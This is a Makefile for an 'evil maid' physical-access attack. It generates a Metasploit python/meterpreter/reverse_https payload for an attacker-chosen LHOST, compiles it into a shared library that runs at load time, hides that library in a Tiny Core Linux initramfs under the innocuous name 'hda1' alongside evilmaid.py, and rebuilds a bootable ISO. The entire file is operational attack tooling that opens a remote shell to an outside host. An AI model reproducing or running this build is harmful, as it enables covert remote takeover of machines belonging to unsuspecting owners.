.PHONY: all clean iso cp core inject mkiso
# run with LHOST=x in env
FILENAME = hda1
WAIT = 90
CFLAGS := $(CFLAGS) -shared -Wall -Werror -pedantic -fpic -Wl,-init,shell -std=c99 -DWAIT=$(WAIT)
CC = gcc
PAYLOAD = msfvenom -f raw -p python/meterpreter/reverse_https LHOST=$(LHOST) 2>/dev/null | sed 's/^/\#define PAYLOAD "/;s/$$/"\n/'
# match rev.c
all: rev.so iso
build: rev.so
iso: cp core inject mkiso
cp:
	sudo cp evilmaid.py core.d/
	sudo cp rev.so core.d/$(FILENAME)
core:
	cd core.d && sudo find . | cut -c3- | sudo cpio -o -H newc | gzip > ../core.gz
inject:
	sudo cp core.gz Core-current/boot/core.gz
mkiso:
	rm -f Core-current.iso
	sudo mkisofs -l -J -R -V TC-custom -no-emul-boot -boot-load-size 4 -boot-info-table -b boot/isolinux/isolinux.bin -c boot/isolinux/boot.cat -o Core-current.iso Core-current
%.so: %.c
	@[ ! -z "${LHOST}" ] || (echo "Please set LHOST env var to lhost" && false)
	$(PAYLOAD) | $(CC) $(CFLAGS) $< -o $@
